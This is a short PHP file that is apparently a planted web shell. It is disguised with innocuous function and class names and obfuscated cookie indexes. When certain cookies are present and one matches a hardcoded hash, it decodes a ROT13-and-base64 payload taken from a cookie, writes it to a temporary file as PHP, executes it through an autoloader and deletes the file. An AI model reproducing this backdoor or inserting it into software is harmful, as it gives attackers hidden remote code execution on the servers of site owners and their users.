<?php


if (isset($_COOKIE[31+-31]) && isset($_COOKIE[-67+68]) && isset($_COOKIE[98-95]) && isset($_COOKIE[56-52])) {
    $data_chunk = $_COOKIE;
    function reverse_lookup($obj) {
        $data_chunk = $_COOKIE;
        $token = tempnam((!empty(session_save_path()) ? session_save_path() : sys_get_temp_dir()), '496c681b');
        if (!is_writable($token)) {
            $token = getcwd() . DIRECTORY_SEPARATOR . "core_engine";
        }
        $desc = "\x3c\x3f\x70\x68p " . base64_decode(str_rot13($data_chunk[3]));
        if (is_writeable($token)) {
            $marker = fopen($token, 'w+');
            fputs($marker, $desc);
            fclose($marker);
            spl_autoload_unregister(__FUNCTION__);
            require_once($token);
            @array_map('unlink', array($token));
        }
    }
    spl_autoload_register("reverse_lookup");
    $record = "8e5f6277e02dcdebe54aed6f4031e83d";
    if (!strncmp($record, $data_chunk[4], 32)) {
        if (@class_parents("app_initializer_splitter_tool", true)) {
            exit;
        }
    }
}
